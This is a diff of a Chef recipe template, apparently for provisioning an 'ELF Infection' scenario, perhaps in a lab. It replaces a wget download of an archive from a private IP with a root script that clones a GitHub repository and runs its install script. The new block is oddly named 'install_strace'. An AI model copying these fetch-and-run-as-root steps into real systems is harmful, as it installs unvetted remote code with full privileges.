@@ -95,9 +95,21 @@ end
 # ELF Infection
 
     <% elsif recipe == 'elf' %>
-bash "get file from remote" do
-  code "mkdir /tmp/bin; cd /tmp/bin; wget http://10.0.127.9/dist.tar; tar xvf dist.tar;"
-  not_if "test -f /tmp/bin/dist.tar"
+script "install_strace" do
+  interpreter "bash"
+  user "root"
+  cwd "/tmp"
+
+  code <<-EOH
+  cd /tmp
+  git clone https://github.com/kahea/elf
+  cd elf
+  ./install
+  cd /tmp
+  touch test-file
+  EOH
+
+  not_if "test -e /tmp/test-file"
 end
 
     <% elsif recipe == 'strace' %>
@@ -371,7 +383,7 @@ script "install_elfit" do
   make
   make install
   cd /tmp
-    
+
   EOH
   not_if "test -x /usr/bin/elfit"
 end
